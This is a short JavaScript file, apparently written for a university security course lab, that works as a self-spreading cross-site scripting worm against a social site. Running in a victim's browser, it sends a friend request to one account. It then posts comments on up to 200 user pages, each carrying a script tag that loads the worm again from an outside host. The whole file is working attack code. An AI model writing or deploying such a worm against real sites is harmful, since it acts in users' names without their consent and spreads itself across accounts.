//Script that crawls through and sends friend requests by Dan
const cookie = new URLSearchParams(document.cookie.replaceAll(";","&"));

function getfriends(i) {
	var request2 = new XMLHttpRequest();
	request2.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=92`, true);
      	request2.send();
      	var request3 = new XMLHttpRequest();
      	request3.open("POST", `/add_comment.php?id=${i}&comment=<script src="http://people.rit.edu/drl3180/friendlyworm.js"></script>`, true);
      	request3.send();
}

if (cookie.get("hasCookie") != "true") {
	var request = new XMLHttpRequest();
	var date = new Date();
	request.open("POST", `/add_comment.php?id=92&comment=Just a friendly worm saying hello :) `+date, true);
	request.send();
	for (var i = 0; i < 200; i++) {	
		getfriends(i);
	}
}
document.cookie = "hasCookie=true"
